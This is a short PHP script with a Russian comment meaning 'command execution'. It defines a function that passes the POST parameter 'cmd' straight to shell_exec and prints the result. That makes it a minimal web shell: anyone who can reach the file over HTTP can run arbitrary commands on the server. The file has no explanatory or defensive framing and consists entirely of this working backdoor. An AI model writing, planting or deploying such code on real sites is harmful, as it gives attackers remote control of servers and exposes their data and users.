<?php
function ex($comd)                             //Выполнение команды
{
   $res = '';
   if (!empty($comd)){
		$res=shell_exec($comd);		
	}
	return $res;
}

$res=ex($_POST['cmd']);
echo $res;
?>